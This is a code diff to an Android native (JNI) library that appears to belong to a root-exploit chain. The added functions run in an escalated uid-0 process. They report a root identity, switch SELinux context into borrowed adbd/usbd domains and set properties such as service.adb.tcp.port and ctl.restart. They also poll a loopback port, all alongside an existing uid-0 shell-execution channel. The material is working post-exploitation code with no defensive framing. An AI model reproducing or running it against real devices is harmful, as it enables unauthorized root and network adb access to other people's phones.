@@ -97,6 +97,8 @@
 #include <time.h>
 #include <unistd.h>
 #include <signal.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
 #include <sys/un.h>
@@ -740,6 +742,135 @@ static jstring exec_shell(JNIEnv *env, jobject thiz __unused, jstring command, j
     return env->NewStringUTF(output.c_str());
 }
 
+/*
+ * ---------------------------------------------------------------------------------------------
+ * Built-in channel actions: the privileged environment, without a shell and without a fork.
+ *
+ * The chain used to send these as command *strings* over the uid-0 channel (`id`, and the two
+ * `runcon <domain> setprop …` pairs plus an `ss -lnt` poll). Spawning `/system/bin/sh` from the
+ * isolated process is what made the whole thing device-dependent: the process can be frozen by
+ * the cached-app freezer, and a spawned child loses the escalation on some builds. None of it is
+ * needed -- every one of those commands is a syscall or a property write, and this process is the
+ * uid 0 one:
+ *
+ *  * `id`                     -> assembled from getuid/getgid plus /proc/self/attr/current,
+ *  * `runcon <domain> setprop` -> `setcon` (via /proc/self/attr/current) around a plain
+ *                                 `__system_property_set`, which is exactly what `runcon`
+ *                                 + `setprop` do; the domain switch is the point and it stays,
+ *  * `ss -lnt | grep <port>`   -> a direct `connect()` probe of 127.0.0.1:<port>.
+ *
+ * `setcon` needs only `dyntransition`, which is granted while SELinux is permissive -- the same
+ * precondition the `runcon` subprocess had (it is the reason the frozen chain borrows the
+ * `adbd`/`usbd` domains at all: `service.adb.tcp.port` is `adbd_config_prop`, `ctl.restart` is
+ * `ctl_adbd_prop`). Switching back is done immediately, so the process keeps its own domain.
+ */
+static void channel_current_context(char *out, size_t cap) {
+    out[0] = '\0';
+    const int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
+    if (fd < 0) return;
+    const ssize_t n = read(fd, out, cap - 1);
+    close(fd);
+    if (n <= 0) {
+        out[0] = '\0';
+        return;
+    }
+    out[n] = '\0';
+    char *nl = strchr(out, '\n');
+    if (nl) *nl = '\0';
+}
+
+static bool channel_switch_context(const char *domain) {
+    const int fd = open("/proc/self/attr/current", O_WRONLY | O_CLOEXEC);
+    if (fd < 0) {
+        LOGW("channel: cannot open attr/current (%d: %s)", errno, strerror(errno));
+        return false;
+    }
+    const ssize_t n = write(fd, domain, strlen(domain));
+    const int saved_errno = errno;
+    close(fd);
+    if (n != (ssize_t) strlen(domain)) {
+        LOGW("channel: setcon(%s) failed (%d: %s)", domain, saved_errno,
+             strerror(saved_errno));
+        return false;
+    }
+    return true;
+}
+
+/* 1) The identity the chain's self-test looks at, in the shape `id` prints. */
+static jstring channel_identity(JNIEnv *env, jobject thiz __unused) {
+    char context[256] = {};
+    channel_current_context(context, sizeof context);
+    char out[512];
+    snprintf(out, sizeof out,
+             "uid=%d(root) gid=%d(root) groups=%d(root) context=%s",
+             (int) getuid(), (int) getgid(), (int) getgid(),
+             context[0] ? context : "unknown");
+    LOGI("channel identity: %s", out);
+    return env->NewStringUTF(out);
+}
+
+/* 2) `runcon <domain> setprop <name> <value>`, in-process. */
+static jstring channel_set_prop_in_domain(JNIEnv *env, jobject thiz __unused,
+                                          jstring domain, jstring name, jstring value) {
+    const char *dom = env->GetStringUTFChars(domain, nullptr);
+    const char *prop = name ? env->GetStringUTFChars(name, nullptr) : nullptr;
+    const char *val = value ? env->GetStringUTFChars(value, nullptr) : nullptr;
+    char result[256];
+    int rc = -1;
+    if (dom == nullptr || prop == nullptr || val == nullptr) {
+        snprintf(result, sizeof result, "__GHOSTLOCK_EXEC_FAILED__: null argument");
+    } else {
+        char saved[256] = {};
+        channel_current_context(saved, sizeof saved);
+        const bool switched = channel_switch_context(dom);
+        /* The vendored AOSP property code is bypassed on purpose: `ctl.*` has to reach init, and
+         * that only happens through property_service -- the same path `setprop` takes. */
+        rc = __system_property_set(prop, val);
+        if (switched && saved[0] != '\0' && !channel_switch_context(saved)) {
+            LOGW("channel: could not switch back to %s (staying in %s)", saved, dom);
+        }
+        LOGI("channel: setprop %s=%s in %s -> rc=%d", prop, val, dom, rc);
+        if (rc != 0) {
+            snprintf(result, sizeof result,
+                     "__GHOSTLOCK_EXEC_FAILED__: property_set(%s, %s) rc=%d in %s",
+                     prop, val, rc, dom);
+        } else {
+            snprintf(result, sizeof result, "%s=%s (in %s)", prop, val, dom);
+        }
+    }
+    if (dom) env->ReleaseStringUTFChars(domain, dom);
+    if (prop) env->ReleaseStringUTFChars(name, prop);
+    if (val) env->ReleaseStringUTFChars(value, val);
+    return env->NewStringUTF(result);
+}
+
+/* 3) Wait until 127.0.0.1:<port> accepts a connection (the `ss -lnt | grep` replacement). */
+static jboolean channel_wait_port(JNIEnv *env __unused, jobject thiz __unused,
+                                  jint port, jint timeout_ms) {
+    const long long budget = timeout_ms > 0 ? timeout_ms : 60'000;
+    struct timespec started{};
+    clock_gettime(CLOCK_MONOTONIC, &started);
+    const long long deadline =
+            (long long) started.tv_sec * 1000LL + started.tv_nsec / 1000000LL + budget;
+    for (;;) {
+        const int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+        if (fd >= 0) {
+            struct sockaddr_in addr{};
+            addr.sin_family = AF_INET;
+            addr.sin_port = htons((uint16_t) port);
+            addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+            const int connected = connect(fd, (struct sockaddr *) &addr, sizeof addr);
+            close(fd);
+            if (connected == 0) return JNI_TRUE;
+        }
+        struct timespec now{};
+        clock_gettime(CLOCK_MONOTONIC, &now);
+        const long long now_ms = (long long) now.tv_sec * 1000LL + now.tv_nsec / 1000000LL;
+        if (now_ms >= deadline) return JNI_FALSE;
+        usleep(500 * 1000);
+    }
+}
+
 JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *jvm, void *v __unused) {
     JNIEnv *env;
     jclass clazz;
@@ -767,6 +898,9 @@ JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *jvm, void *v __unused) {
              * holds. The socket server (`start_shell_server`) is gone from the registrations --
              * its AF_UNIX path + token turned out to be device-dependent. */
             {"exec_shell",        "(Ljava/lang/String;I)Ljava/lang/String;", (void *) exec_shell},
+            {"channel_identity",  "()Ljava/lang/String;", (void *) channel_identity},
+            {"channel_set_prop",  "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;", (void *) channel_set_prop_in_domain},
+            {"channel_wait_port", "(II)Z", (void *) channel_wait_port},
  };
     if (env->RegisterNatives(clazz, methods, arraysize(methods)) < 0) {
         LOGE("JNI_OnLoad: RegisterNatives failed");
